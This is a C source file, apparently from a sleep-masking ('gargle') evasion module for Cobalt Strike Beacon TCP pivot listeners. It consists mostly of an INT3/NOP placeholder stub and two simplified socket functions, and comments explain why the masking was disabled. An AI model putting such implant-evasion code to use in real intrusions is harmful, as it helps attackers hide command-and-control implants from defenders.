/* gargle! */
#include <WinSock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"

#define GARGLE_TCP_ACTION_RECV   0
#define GARGLE_TCP_ACTION_ACCEPT 1

typedef struct {
	int    action;
	SOCKET in;
	SOCKET out;
	SOCKET (__stdcall *accept)(SOCKET, struct sockaddr *, int *);
	void   (__stdcall *recv)(SOCKET, void *, int, int);
} GARGLE_TCP_ARGS;

typedef void(*GARGLEF)(GARGLEP * parms, GARGLE_TCP_ARGS * args);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, GARGLE_TCP_ARGS * args) {
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();

}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleWaitTCP(SOCKET s) {
	/* INT3-placeholder trampoline (see gargle_pivot_smb.cpp): with a
	 * mask-enabled profile this used to execute the template stub and
	 * kill every TCP pivot listener. No-op = unmasked recv wait, the
	 * proven nook == 0 posture. */
	(void)s;
}

SOCKET GargleAccept(SOCKET s) {
	/* Same trap: accept unmasked instead of executing the INT3 template. */
	return accept(s, NULL, 0);
}